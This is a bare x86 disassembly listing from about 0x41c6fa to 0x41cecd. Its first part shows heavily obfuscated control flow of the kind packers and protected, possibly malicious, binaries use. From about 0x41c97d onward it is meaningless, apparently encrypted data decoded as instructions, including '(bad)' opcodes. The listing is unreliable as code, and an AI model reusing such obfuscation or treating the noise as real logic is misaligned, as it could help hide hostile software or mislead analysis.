  41c6fa:	xor    DWORD PTR ds:0x42c000,0x390a
  41c704:	xor    ecx,eax
  41c706:	sbb    DWORD PTR ds:0x428020,0x44b0
  41c710:	add    ecx,esi
  41c712:	jne    0x41c4ba
  41c718:	jmp    0x41ed36
  41c71d:	xor    edx,edx
  41c71f:	add    edx,DWORD PTR ds:0x42176a
  41c725:	mov    ecx,DWORD PTR ds:0x4234ca
  41c72b:	sub    ecx,edx
  41c72d:	and    edx,DWORD PTR [edx+ecx*1]
  41c730:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c733:	sub    DWORD PTR ds:0x42b00c,0x42a008
  41c73d:	mov    edx,DWORD PTR [ebp-0x8]
  41c740:	xor    ecx,eax
  41c742:	or     DWORD PTR ds:0x42c014,0x2e7c
  41c74c:	xor    edx,eax
  41c74e:	sub    ecx,edx
  41c750:	sub    ecx,esi
  41c752:	xor    ecx,eax
  41c754:	mov    DWORD PTR [ebp-0x1c],ecx
  41c757:	mov    ecx,0x464b
  41c75c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c75f:	mov    DWORD PTR [ebp+0x8],ecx
  41c762:	jmp    0x41c827
  41c767:	and    DWORD PTR ds:0x42a008,0x0
  41c771:	jmp    0x41c783
  41c776:	mov    edi,DWORD PTR ds:0x42a008
  41c77c:	inc    edi
  41c77d:	mov    DWORD PTR ds:0x42a008,edi
  41c783:	cmp    DWORD PTR ds:0x42a008,0x11
  41c78a:	jae    0x41c7ee
  41c790:	cmp    DWORD PTR ds:0x42a008,0x6
  41c797:	jne    0x41c7b9
  41c79d:	push   DWORD PTR [ebp-0x14]
  41c7a0:	push   DWORD PTR [ebp-0x18]
  41c7a3:	push   DWORD PTR [ebp-0x10]
  41c7a6:	push   DWORD PTR [ebp-0x10]
  41c7a9:	push   0x7583
  41c7ae:	push   0x42b000
  41c7b3:	call   DWORD PTR ds:0x424038
  41c7b9:	cmp    DWORD PTR ds:0x42a008,0x5
  41c7c0:	jne    0x41c7d5
  41c7c6:	xor    edi,edi
  41c7c8:	or     edi,DWORD PTR ds:0x42a008
  41c7ce:	inc    edi
  41c7cf:	mov    DWORD PTR ds:0x42a008,edi
  41c7d5:	jmp    0x41c776
  41c7da:	xor    ecx,ecx
  41c7dc:	add    ecx,DWORD PTR ds:0x42b000
  41c7e2:	adc    ecx,DWORD PTR ds:0x42b008
  41c7e8:	mov    DWORD PTR ds:0x42b000,ecx
  41c7ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7f1:	mov    edx,DWORD PTR ds:0x42c018
  41c7f7:	sbb    DWORD PTR ds:0x42a01c,edx
  41c7fd:	mov    edx,DWORD PTR [ebp-0x8]
  41c800:	xor    ecx,eax
  41c802:	xor    edx,eax
  41c804:	sub    ecx,edx
  41c806:	sub    ecx,esi
  41c808:	xor    ecx,eax
  41c80a:	mov    DWORD PTR [ebp+0x8],ecx
  41c80d:	mov    ecx,DWORD PTR [ebp+0x8]
  41c810:	mov    edx,DWORD PTR [ebp+0x8]
  41c813:	imul   edx,edx,0x5708f5
  41c819:	xor    ecx,eax
  41c81b:	add    ecx,esi
  41c81d:	lea    ecx,[ebp+ecx*4-0x64]
  41c821:	mov    edi,DWORD PTR [ecx]
  41c823:	add    edx,edi
  41c825:	mov    DWORD PTR [ecx],edx
  41c827:	mov    ecx,DWORD PTR [ebp+0x8]
  41c82a:	xor    ecx,eax
  41c82c:	add    ecx,esi
  41c82e:	jne    0x41c767
  41c834:	mov    ecx,DWORD PTR [ebp-0x20]
  41c837:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c83e:	mov    dl,BYTE PTR [ebp-0x1]
  41c841:	cmp    cl,dl
  41c843:	je     0x41c91c
  41c849:	mov    ecx,DWORD PTR [ebp-0x20]
  41c84c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c853:	mov    edx,DWORD PTR [ebp+0xc]
  41c856:	cmp    cl,BYTE PTR [edx]
  41c858:	jne    0x41ed48
  41c85e:	mov    ecx,DWORD PTR [ebp-0x14]
  41c861:	mov    edx,DWORD PTR [ebp+0xc]
  41c864:	movsx  edx,BYTE PTR [edx]
  41c867:	xor    ecx,eax
  41c869:	add    ecx,esi
  41c86b:	cmp    edx,ecx
  41c86d:	mov    ecx,DWORD PTR [ebp-0xc]
  41c870:	mov    DWORD PTR [ebp+0x8],ecx
  41c873:	mov    ecx,DWORD PTR [ebp+0x8]
  41c876:	je     0x42113d
  41c87c:	jmp    0x41c8b1
  41c881:	mov    ecx,DWORD PTR [ebp+0x8]
  41c884:	mov    edx,DWORD PTR [ebp-0x8]
  41c887:	xor    ecx,eax
  41c889:	xor    edx,eax
  41c88b:	sub    ecx,edx
  41c88d:	sub    ecx,esi
  41c88f:	xor    ecx,eax
  41c891:	mov    DWORD PTR [ebp+0x8],ecx
  41c894:	mov    ecx,DWORD PTR [ebp+0x8]
  41c897:	mov    edx,DWORD PTR [ebp+0x8]
  41c89a:	xor    ecx,eax
  41c89c:	imul   edx,edx,0x5708f5
  41c8a2:	add    ecx,esi
  41c8a4:	lea    ecx,[ebp+ecx*4-0x64]
  41c8a8:	mov    edi,DWORD PTR [ecx]
  41c8aa:	add    edx,edi
  41c8ac:	mov    DWORD PTR [ecx],edx
  41c8ae:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8b1:	xor    ecx,eax
  41c8b3:	add    ecx,esi
  41c8b5:	jne    0x41c881
  41c8bb:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8be:	mov    edx,DWORD PTR [ebp+0x8]
  41c8c1:	xor    ecx,eax
  41c8c3:	xor    edx,eax
  41c8c5:	add    ecx,esi
  41c8c7:	add    edx,esi
  41c8c9:	cmp    ecx,edx
  41c8cb:	jae    0x41c961
  41c8d1:	lea    edx,[ecx-0x3272db]
  41c8d7:	mov    DWORD PTR [ebp-0x18],edx
  41c8da:	mov    edi,DWORD PTR [ebp-0x18]
  41c8dd:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41c8e4:	lea    edx,[ebp-0x24]
  41c8e7:	mov    DWORD PTR [ebp-0x10],edx
  41c8ea:	mov    edx,DWORD PTR [ebp-0x10]
  41c8ed:	add    DWORD PTR [edx],0x705fa08
  41c8f3:	mov    ebx,DWORD PTR [ebp-0x10]
  41c8f6:	xor    edi,eax
  41c8f8:	add    edi,DWORD PTR [ebx]
  41c8fa:	lea    edx,[ebp+ecx*4-0x64]
  41c8fe:	mov    ebx,DWORD PTR [edx]
  41c900:	xor    edi,ebx
  41c902:	mov    DWORD PTR [edx],edi
  41c904:	mov    edx,DWORD PTR [ebp+0x8]
  41c907:	xor    edx,eax
  41c909:	inc    ecx
  41c90a:	inc    DWORD PTR [ebp-0x18]
  41c90d:	add    edx,esi
  41c90f:	cmp    ecx,edx
  41c911:	jb     0x41c8da
  41c917:	jmp    0x41c961
  41c91c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c91f:	mov    DWORD PTR [ebp+0x8],ecx
  41c922:	jmp    0x41c954
  41c927:	mov    ecx,DWORD PTR [ebp+0x8]
  41c92a:	mov    edx,DWORD PTR [ebp-0x8]
  41c92d:	xor    ecx,eax
  41c92f:	xor    edx,eax
  41c931:	sub    ecx,edx
  41c933:	sub    ecx,esi
  41c935:	xor    ecx,eax
  41c937:	mov    DWORD PTR [ebp+0x8],ecx
  41c93a:	mov    ecx,DWORD PTR [ebp+0x8]
  41c93d:	mov    edx,DWORD PTR [ebp+0x8]
  41c940:	imul   edx,edx,0x5708f5
  41c946:	xor    ecx,eax
  41c948:	add    ecx,esi
  41c94a:	lea    ecx,[ebp+ecx*4-0x64]
  41c94e:	mov    edi,DWORD PTR [ecx]
  41c950:	add    edx,edi
  41c952:	mov    DWORD PTR [ecx],edx
  41c954:	mov    ecx,DWORD PTR [ebp+0x8]
  41c957:	xor    ecx,eax
  41c959:	add    ecx,esi
  41c95b:	jne    0x41c927
  41c961:	mov    ecx,DWORD PTR [ebp-0xc]
  41c964:	mov    DWORD PTR [ebp+0x8],ecx
  41c967:	jmp    0x41ed14
  41c96c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c96f:	mov    edx,DWORD PTR [ebp-0x8]
  41c972:	xor    ecx,eax
  41c974:	xor    edx,eax
  41c976:	sub    ecx,edx
  41c978:	jmp    0x41ecf3
  41c97d:	rcr    DWORD PTR [esi+0x158d36fd],1
  41c983:	imul   esp,DWORD PTR [ebp-0x6e],0x9e80d858
  41c98a:	sbb    edx,DWORD PTR [eax]
  41c98c:	xchg   esp,eax
  41c98d:	loope  0x41c98c
  41c98f:	popa   
  41c990:	bound  eax,QWORD PTR [edi+ebx*2]
  41c993:	bound  esp,QWORD PTR [edx+0x1b]
  41c996:	retf   
  41c997:	dec    edi
  41c998:	bnd call 0x47d6ecad
  41c99e:	jae    0x41c9aa
  41c9a0:	loop   0x41c926
  41c9a2:	out    0xc7,eax
  41c9a4:	outs   dx,DWORD PTR ds:[esi]
  41c9a5:	sub    ebp,DWORD PTR [edi]
  41c9a7:	stos   DWORD PTR es:[edi],eax
  41c9a8:	pop    edi
  41c9a9:	cmp    BYTE PTR [ecx],cl
  41c9ab:	sub    al,0x8f
  41c9ad:	pop    eax
  41c9ae:	jbe    0x41c9aa
  41c9b0:	repz test DWORD PTR [ebx+0x29],0xa8991d6a
  41c9b8:	pushf  
  41c9b9:	addr16 in al,0xa1
  41c9bc:	mov    edx,esi
  41c9be:	or     cl,BYTE PTR [edx]
  41c9c0:	mov    dl,BYTE PTR [ecx-0x79]
  41c9c3:	push   edi
  41c9c4:	and    edx,DWORD PTR ds:0x26ca2ef2
  41c9ca:	pop    ss
  41c9cb:	push   edx
  41c9cc:	xchg   sp,ax
  41c9ce:	pop    esp
  41c9cf:	mov    edx,0x3f44565a
  41c9d4:	fisttp WORD PTR [ecx+edi*4]
  41c9d7:	push   cs
  41c9d8:	inc    ecx
  41c9d9:	jmp    0xb0a25faf
  41c9de:	and    ah,BYTE PTR [ebp+0x25]
  41c9e1:	xchg   esp,esp
  41c9e3:	cmp    ebx,DWORD PTR [ebx]
  41c9e5:	adc    al,0x21
  41c9e7:	fwait
  41c9e8:	(bad)  
  41c9e9:	push   ebx
  41c9ea:	pop    edx
  41c9eb:	call   0x68f8:0xfff5baee
  41c9f2:	add    eax,0x4fd29920
  41c9f7:	sub    DWORD PTR [ecx-0x1],ebp
  41c9fa:	stc    
  41c9fb:	sub    al,0xd2
  41c9fd:	mov    BYTE PTR [esi+0x6bf53f07],bl
  41ca03:	mov    esi,ss
  41ca05:	fs push 0xffffffab
  41ca08:	(bad)  
  41ca09:	cli    
  41ca0a:	repnz call 0xa231:0xeee14962
  41ca12:	(bad)  
  41ca13:	push   ds
  41ca14:	jg     0x41ca49
  41ca16:	repz cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41ca19:	dec    ebx
  41ca1a:	pop    eax
  41ca1b:	push   eax
  41ca1c:	dec    esi
  41ca1d:	fstp   TBYTE PTR [edx+eiz*8]
  41ca20:	(bad)  
  41ca21:	mul    BYTE PTR [eax]
  41ca23:	cmp    DWORD PTR [eax+0x532600a],ebp
  41ca29:	sbb    edi,ecx
  41ca2b:	sbb    ebp,DWORD PTR [ebp-0x480b1eb8]
  41ca31:	push   es
  41ca32:	aam    0x1f
  41ca34:	fdiv   st(3),st
  41ca36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca37:	ss mov bh,0x9c
  41ca3a:	popa   
  41ca3b:	and    DWORD PTR [ecx],edi
  41ca3d:	sbb    DWORD PTR [edx+edx*8],esi
  41ca40:	adc    cl,ah
  41ca42:	jns    0x41ca50
  41ca44:	or     ch,BYTE PTR [ebx-0x7f9ed0bf]
  41ca4a:	xor    DWORD PTR [edi-0x2],ecx
  41ca4d:	mov    ?,WORD PTR [ebx]
  41ca4f:	js     0x41c9d6
  41ca51:	pop    esi
  41ca52:	adc    BYTE PTR [ebp-0x1c],al
  41ca55:	mov    eax,ds:0xb4c5f7ad
  41ca5a:	pop    edi
  41ca5b:	popa   
  41ca5c:	or     BYTE PTR [esi+edi*2-0x3bf5341a],dh
  41ca63:	imul   esp,ecx,0xb8bf75c5
  41ca69:	test   eax,0xec119570
  41ca6e:	pop    esi
  41ca6f:	fucomp st(5)
  41ca71:	in     eax,dx
  41ca72:	scas   al,BYTE PTR es:[edi]
  41ca73:	cmc    
  41ca74:	imul   esi,DWORD PTR [ebx-0x72],0x75a8784f
  41ca7b:	xchg   ecx,eax
  41ca7c:	mov    ebp,0x808c6c23
  41ca81:	inc    eax
  41ca82:	sar    DWORD PTR [esp+ebx*8],0x1c
  41ca86:	sbb    bh,BYTE PTR [ebp+0x32083444]
  41ca8c:	or     DWORD PTR [esi],ebp
  41ca8e:	out    0x5,al
  41ca90:	clc    
  41ca91:	ds jp  0x41ca86
  41ca94:	mov    ebx,ebx
  41ca96:	call   0x7827:0x3d249b5b
  41ca9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca9e:	or     BYTE PTR [esi],ch
  41caa0:	icebp  
  41caa1:	pusha  
  41caa2:	xor    dh,BYTE PTR [ebp-0x51a5bfff]
  41caa8:	stos   BYTE PTR es:[edi],al
  41caa9:	mov    dh,0x92
  41caab:	xlat   BYTE PTR ds:[ebx]
  41caac:	push   es
  41caad:	adc    dl,ch
  41caaf:	bound  esi,QWORD PTR [ebx]
  41cab1:	adc    al,0x39
  41cab3:	mov    WORD PTR fs:[edi*4-0x5192cb57],ss
  41cabb:	lods   eax,DWORD PTR ds:[esi]
  41cabc:	(bad)  
  41cabe:	loope  0x41ca71
  41cac0:	push   ds
  41cac1:	push   eax
  41cac2:	xor    DWORD PTR [ebp-0x385fa339],ecx
  41cac8:	xchg   ebx,eax
  41cac9:	jecxz  0x41cad2
  41cacb:	add    eax,0xa48eec89
  41cad0:	xor    BYTE PTR [esi+eax*2-0x4f],bl
  41cad4:	push   ecx
  41cad5:	fnsave [edx-0x76a410e4]
  41cadb:	pop    eax
  41cadc:	pop    ss
  41cadd:	lds    ecx,FWORD PTR [ecx]
  41cadf:	loopne 0x41cb32
  41cae1:	cmp    al,0xa0
  41cae3:	nop
  41cae4:	cmp    BYTE PTR ds:0x16513d03,0xbf
  41caeb:	jl     0x41cb20
  41caed:	ins    DWORD PTR es:[edi],dx
  41caee:	mov    ch,0x6d
  41caf0:	dec    edx
  41caf1:	cld    
  41caf2:	sbb    BYTE PTR [ebp+0x496feba3],0x16
  41caf9:	mov    dh,0x3f
  41cafb:	dec    edx
  41cafc:	ins    BYTE PTR es:[edi],dx
  41cafd:	xchg   ebx,eax
  41cafe:	push   es
  41caff:	xor    ch,BYTE PTR [esi]
  41cb01:	loop   0x41cb7c
  41cb03:	inc    edi
  41cb04:	daa    
  41cb05:	pop    edi
  41cb06:	push   ecx
  41cb07:	ret    
  41cb08:	and    DWORD PTR [ebp+ebx*4+0x52],edx
  41cb0c:	mov    eax,ds:0xdcfe9bc9
  41cb11:	ret    
  41cb12:	mov    WORD PTR [ecx-0x7991c901],es
  41cb18:	sbb    bh,BYTE PTR [esi-0x48ac0ffd]
  41cb1e:	inc    ebx
  41cb1f:	mov    ebp,0xc3d1ea6
  41cb24:	cmc    
  41cb25:	inc    esp
  41cb26:	pop    ss
  41cb27:	cmp    DWORD PTR [eax],esi
  41cb29:	inc    ecx
  41cb2a:	sar    DWORD PTR ds:0x98551375,cl
  41cb30:	sub    DWORD PTR [edx+0x59],esi
  41cb33:	and    bl,bl
  41cb35:	rol    BYTE PTR [ecx-0x44e2f1e5],0x1e
  41cb3c:	js     0x41cbb7
  41cb3e:	out    0xa4,al
  41cb40:	jo     0x41caf6
  41cb42:	nop
  41cb43:	mov    dl,0xa2
  41cb45:	jecxz  0x41cb79
  41cb47:	fnclex 
  41cb49:	jecxz  0x41cb99
  41cb4b:	ins    DWORD PTR es:[edi],dx
  41cb4c:	mov    edi,0xe2d90f39
  41cb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb52:	stc    
  41cb53:	push   ebp
  41cb54:	or     DWORD PTR [esi-0x3e],0x4a3d8332
  41cb5b:	addr16 xchg edx,eax
  41cb5d:	pushf  
  41cb5e:	inc    ebx
  41cb5f:	cmp    BYTE PTR [eax+0x45],ah
  41cb62:	mul    DWORD PTR [eax-0x3021768a]
  41cb68:	add    BYTE PTR [esi+0x56],bl
  41cb6b:	lea    eax,ds:0x30fd7bab
  41cb71:	add    DWORD PTR [edi],edx
  41cb73:	ret    0x82a7
  41cb76:	jo     0x41cb34
  41cb78:	mov    esp,0x697def08
  41cb7d:	lock (bad) 
  41cb7f:	cmp    ebx,ebp
  41cb81:	retf   0x567e
  41cb84:	das    
  41cb85:	cmp    eax,0x6b0c7e94
  41cb8a:	aas    
  41cb8b:	jle    0x41cb85
  41cb8d:	adc    al,ch
  41cb8f:	ret    0xff64
  41cb92:	je     0x41cb61
  41cb94:	sbb    DWORD PTR [eax],0xf20c2485
  41cb9a:	push   ss
  41cb9b:	mov    DWORD PTR [eax+0x3e],0x43fa7692
  41cba2:	or     ecx,DWORD PTR [esi-0x2821def1]
  41cba8:	fisubr DWORD PTR [esi-0x4c59f6fa]
  41cbae:	pop    es
  41cbaf:	fcomp  QWORD PTR [esi+0x484a92d4]
  41cbb5:	push   ebp
  41cbb6:	mov    ds:0x8b8606e3,eax
  41cbbb:	loopne 0x41cc0d
  41cbbd:	bnd jno 0x41cb8f
  41cbc0:	xchg   DWORD PTR [edi],ebx
  41cbc2:	addr16 pushf 
  41cbc4:	or     DWORD PTR [ecx-0x43c75d5f],0x18ef00a6
  41cbce:	push   0xffffff98
  41cbd0:	popa   
  41cbd1:	loop   0x41cbe3
  41cbd3:	(bad)  
  41cbd4:	mov    al,0x1e
  41cbd6:	jmp    0x41cc2b
  41cbd8:	ror    BYTE PTR [esi-0x20],0xa1
  41cbdc:	sbb    al,0x84
  41cbde:	jae    0x41cc1e
  41cbe0:	and    DWORD PTR [ecx+ebp*8+0x6d],esp
  41cbe4:	in     eax,0x8
  41cbe6:	lods   al,BYTE PTR ds:[esi]
  41cbe7:	lods   eax,DWORD PTR ds:[esi]
  41cbe8:	enter  0xab4a,0x40
  41cbec:	in     eax,0xb8
  41cbee:	xlat   BYTE PTR ds:[ebx]
  41cbef:	dec    ebp
  41cbf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbf1:	nop
  41cbf2:	mov    cs,ecx
  41cbf4:	lock (bad) 
  41cbf6:	call   DWORD PTR [edx+0x4e6c3d87]
  41cbfc:	xor    eax,0x9e100bbf
  41cc01:	cld    
  41cc02:	das    
  41cc03:	inc    ebx
  41cc04:	jne    0x41cc5c
  41cc06:	fs dec esi
  41cc08:	jns    0x41cbfd
  41cc0a:	jbe    0x41cc1d
  41cc0c:	push   ss
  41cc0d:	xor    eax,edx
  41cc0f:	repz call 0x352c894e
  41cc15:	xlat   BYTE PTR ds:[ebx]
  41cc16:	retf   
  41cc17:	int    0xef
  41cc19:	add    al,0xf2
  41cc1b:	or     DWORD PTR [ebx-0x482e84ed],ebp
  41cc21:	rol    DWORD PTR [edi+0x34afaf36],0x30
  41cc28:	retf   
  41cc29:	lods   al,BYTE PTR ds:[esi]
  41cc2a:	stos   DWORD PTR es:[edi],eax
  41cc2b:	mov    ds,WORD PTR [esi+0x2]
  41cc2e:	pop    es
  41cc2f:	xor    eax,0x9f986bec
  41cc34:	pop    edx
  41cc35:	push   cs
  41cc36:	or     al,0x4d
  41cc38:	cmp    eax,0xffa25172
  41cc3d:	dec    ebx
  41cc3e:	mov    edi,ecx
  41cc40:	xchg   DWORD PTR [edx-0xd2ddcc8],edx
  41cc46:	dec    edi
  41cc47:	jae    0x41cbe8
  41cc49:	push   edi
  41cc4a:	push   ebp
  41cc4b:	imul   ebx,DWORD PTR [ecx+0x4b40dac5],0x6db2c667
  41cc55:	in     eax,dx
  41cc56:	ror    DWORD PTR ds:0xafea898c,1
  41cc5c:	pop    ss
  41cc5d:	adc    dl,dl
  41cc5f:	inc    ebp
  41cc60:	pop    cx
  41cc62:	jle    0x41cc81
  41cc64:	ret    0xbeeb
  41cc67:	or     BYTE PTR [edi+0x37],0x9d
  41cc6b:	mov    DWORD PTR [eax+0x48e8cd6b],esi
  41cc71:	inc    ebp
  41cc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc73:	cmc    
  41cc74:	mov    eax,ds:0xd9ceaef8
  41cc79:	imul   ecx,DWORD PTR [esi+0x42],0xc2dd7663
  41cc80:	rcr    edx,0x4
  41cc83:	add    ch,ch
  41cc85:	sub    eax,0x546655a6
  41cc8a:	mov    cl,0x7a
  41cc8c:	pop    ebx
  41cc8d:	loope  0x41cc38
  41cc8f:	cdq    
  41cc90:	mov    ecx,0xab798631
  41cc95:	mov    ds:0x44ae54b3,eax
  41cc9a:	inc    esi
  41cc9b:	or     BYTE PTR [eax+0xd],0x3a
  41cc9f:	sbb    BYTE PTR [edx-0x57],dh
  41cca2:	ins    BYTE PTR es:[edi],dx
  41cca3:	sbb    al,0x5b
  41cca5:	daa    
  41cca6:	cmp    al,0xac
  41cca8:	cli    
  41cca9:	sub    bl,BYTE PTR [ebx-0x5d]
  41ccac:	popf   
  41ccad:	daa    
  41ccae:	sar    BYTE PTR [ebp+0x12],cl
  41ccb1:	leave  
  41ccb2:	pop    ss
  41ccb3:	in     eax,dx
  41ccb4:	add    al,0xa9
  41ccb6:	enter  0x715e,0x0
  41ccba:	jle    0x41cc7c
  41ccbc:	int    0x5b
  41ccbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccbf:	test   ch,ch
  41ccc1:	sar    edx,0x81
  41ccc4:	test   DWORD PTR [ecx+0x3070a89d],0x879ff805
  41ccce:	lahf   
  41cccf:	into   
  41ccd0:	jmp    0xfeca718
  41ccd5:	jmp    0x6436f673
  41ccda:	icebp  
  41ccdb:	add    DWORD PTR [esi+0x82666d8],eax
  41cce1:	sub    BYTE PTR [ebx-0x4],cl
  41cce4:	fiadd  DWORD PTR [ebx]
  41cce6:	rol    DWORD PTR [ebx-0x24ea48ed],cl
  41ccec:	scas   al,BYTE PTR es:[edi]
  41cced:	fistp  DWORD PTR cs:[ecx]
  41ccf0:	jmp    0x41ccd6
  41ccf2:	pop    ebx
  41ccf3:	mov    ds:0xf0ca1c22,al
  41ccf8:	into   
  41ccf9:	dec    edx
  41ccfa:	mov    ch,0x35
  41ccfc:	xchg   bl,bh
  41ccfe:	add    eax,0xa9ca35cc
  41cd03:	and    cl,dl
  41cd05:	jb     0x41cd52
  41cd07:	xor    edx,edi
  41cd09:	sbb    eax,eax
  41cd0b:	push   ss
  41cd0c:	jo     0x41cd3e
  41cd0e:	xchg   edi,ebx
  41cd10:	add    edx,0xffffffd2
  41cd13:	xchg   ecx,eax
  41cd14:	inc    eax
  41cd15:	cmp    DWORD PTR [ebp+0x5515621a],esp
  41cd1b:	lods   eax,DWORD PTR ds:[esi]
  41cd1c:	int    0xcd
  41cd1e:	repnz icebp 
  41cd20:	push   ds
  41cd21:	int    0x3
  41cd23:	mov    bl,0x1c
  41cd25:	in     eax,dx
  41cd26:	inc    edi
  41cd27:	test   eax,0x124b8f33
  41cd2c:	addr16 ja 0x41ccbb
  41cd2f:	or     al,0xb2
  41cd31:	or     eax,0x245cb3e0
  41cd36:	out    dx,al
  41cd37:	adc    ebp,ebx
  41cd39:	inc    edi
  41cd3a:	nop
  41cd3b:	and    BYTE PTR [edx+ecx*8+0x78],ah
  41cd3f:	xor    ebp,DWORD PTR [ebx]
  41cd41:	xor    BYTE PTR [edx-0x20add284],dh
  41cd47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd48:	or     bh,ch
  41cd4a:	data16 scas al,BYTE PTR es:[edi]
  41cd4c:	gs mov edx,0x2f2e6c0f
  41cd52:	xor    edx,0xffffffc9
  41cd55:	push   es
  41cd56:	inc    ebp
  41cd57:	imul   esi,DWORD PTR [ecx-0x734dd69e],0x9
  41cd5e:	hlt    
  41cd5f:	mov    cl,BYTE PTR ds:0x1afc5249
  41cd65:	sar    DWORD PTR [eax],1
  41cd67:	icebp  
  41cd68:	retf   
  41cd69:	adc    DWORD PTR [ebx+0x76],0xffffffbb
  41cd6d:	wrmsr  
  41cd6f:	retf   
  41cd70:	and    DWORD PTR [eax],esi
  41cd72:	adc    ch,ah
  41cd74:	jne    0x41cd72
  41cd76:	lea    ebx,[eax+0x4d0ec151]
  41cd7c:	cmp    eax,0x9730ca54
  41cd81:	inc    ecx
  41cd82:	mov    WORD PTR [ebx+0x6c2329b5],ds
  41cd88:	out    0x30,al
  41cd8a:	retf   0xa823
  41cd8d:	jnp    0x41cd8d
  41cd8f:	dec    ecx
  41cd90:	sub    al,0x55
  41cd92:	pusha  
  41cd93:	iret   
  41cd94:	jl     0x41cdb5
  41cd96:	sbb    BYTE PTR [ecx+0x4e41a516],0x81
  41cd9d:	pop    es
  41cd9e:	ret    
  41cd9f:	fdiv   QWORD PTR [edx+eiz*4-0x48]
  41cda3:	cmp    ebx,edi
  41cda5:	aad    0x92
  41cda7:	inc    eax
  41cda8:	dec    ecx
  41cda9:	sbb    eax,0xb7550014
  41cdae:	dec    ecx
  41cdaf:	retf   
  41cdb0:	push   eax
  41cdb1:	push   esi
  41cdb2:	xor    DWORD PTR [eax-0x5d],ecx
  41cdb5:	push   0x1c63f662
  41cdba:	dec    ebx
  41cdbb:	and    al,0x9d
  41cdbd:	mov    dh,0xea
  41cdbf:	add    BYTE PTR [ecx+0x1c750de2],0x6d
  41cdc6:	mov    DWORD PTR [ecx+edi*2],ebx
  41cdc9:	aas    
  41cdca:	xchg   al,cl
  41cdcc:	xor    BYTE PTR [ecx+0x64a38cc2],dl
  41cdd2:	popf   
  41cdd3:	sbb    eax,0x970fdf77
  41cdd8:	or     eax,0xbb5416b2
  41cddd:	aad    0xe8
  41cddf:	pop    edi
  41cde0:	sti    
  41cde1:	cmp    BYTE PTR [ebx],0xb2
  41cde4:	dec    ebp
  41cde5:	js     0x41cdd8
  41cde7:	mov    al,0x51
  41cde9:	imul   eax,DWORD PTR [ecx+ebp*2],0x92533472
  41cdf0:	mov    eax,0xe466c5b7
  41cdf5:	jo     0x41cd94
  41cdf7:	(bad)  
  41cdf8:	mov    ds:0x6bd88bea,al
  41cdfd:	fiadd  DWORD PTR [esi+0x4a5e9784]
  41ce03:	jge    0x41cdb1
  41ce05:	jl     0x41ce1e
  41ce07:	mov    al,0x77
  41ce09:	popf   
  41ce0a:	(bad)  
  41ce0b:	mov    eax,0x9f4999b7
  41ce10:	fsub   st(6),st
  41ce12:	and    BYTE PTR [eax+0x55e838e],bl
  41ce18:	sub    ebp,DWORD PTR [ebp+0x7b]
  41ce1b:	pop    ecx
  41ce1c:	(bad)  
  41ce1d:	repz dec ebp
  41ce1f:	sahf   
  41ce20:	mov    ebx,0xace4f212
  41ce25:	sahf   
  41ce26:	push   esp
  41ce27:	loopne 0x41ce10
  41ce29:	inc    esi
  41ce2a:	pop    ecx
  41ce2b:	mov    dh,0x5e
  41ce2d:	pop    ecx
  41ce2e:	adc    dl,BYTE PTR [ecx-0x6ccd931c]
  41ce34:	jg     0x41ce37
  41ce36:	aas    
  41ce37:	cmp    al,0x25
  41ce39:	jge    0x41ce51
  41ce3b:	and    esp,edx
  41ce3d:	sub    DWORD PTR [eax+edx*1+0x371993d1],0x65
  41ce45:	aad    0xd8
  41ce47:	pop    edx
  41ce48:	push   cs
  41ce49:	xchg   BYTE PTR [eax],bh
  41ce4b:	adc    al,0x75
  41ce4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce4e:	sub    esp,DWORD PTR [ecx+0x5d]
  41ce51:	test   al,0xb9
  41ce53:	or     edi,ebp
  41ce55:	mov    ebp,0x1ad5adc0
  41ce5a:	out    dx,al
  41ce5b:	xchg   esp,eax
  41ce5c:	cdq    
  41ce5d:	xchg   ebp,eax
  41ce5e:	imul   eax,DWORD PTR [eax],0xf16791e2
  41ce64:	push   ds
  41ce65:	addr16 adc al,0x14
  41ce68:	lea    ebp,[ebp+0x90dadf4]
  41ce6e:	ds adc dl,dh
  41ce71:	pop    esi
  41ce72:	push   ecx
  41ce73:	or     eax,0x17393a65
  41ce78:	lea    ebx,[esi+0x5a]
  41ce7b:	sbb    eax,0xa8204457
  41ce80:	add    al,0x47
  41ce82:	xchg   esp,eax
  41ce83:	inc    ecx
  41ce84:	cld    
  41ce85:	loope  0x41ce9d
  41ce87:	das    
  41ce88:	test   esp,esi
  41ce8a:	inc    ebp
  41ce8b:	mov    ebp,0xb961422a
  41ce90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce91:	pop    es
  41ce92:	outs   dx,BYTE PTR ds:[esi]
  41ce93:	dec    eax
  41ce94:	cli    
  41ce95:	aaa    
  41ce96:	pusha  
  41ce97:	push   ss
  41ce98:	inc    edi
  41ce99:	leave  
  41ce9a:	cmp    DWORD PTR [edi+0x940496d],ebx
  41cea0:	jmp    0x54db3773
  41cea5:	fadd   QWORD PTR [eax-0x388cf236]
  41ceab:	repz inc edx
  41cead:	pop    ebx
  41ceae:	cmp    DWORD PTR [eax-0x73dad28a],esp
  41ceb4:	pop    edx
  41ceb5:	adc    edx,DWORD PTR [edx]
  41ceb7:	adc    BYTE PTR [ebx+0x7b],al
  41ceba:	cmp    ebp,edi
  41cebc:	jbe    0x41cebe
  41cebe:	sbb    DWORD PTR ds:0x11683739,edi
  41cec4:	push   cs
  41cec5:	push   es
  41cec6:	or     DWORD PTR [edx-0x73da8555],edx
  41cecc:	std    
  41cecd:	add    BYTE PTR [edx-0x6ea8f28c],bl
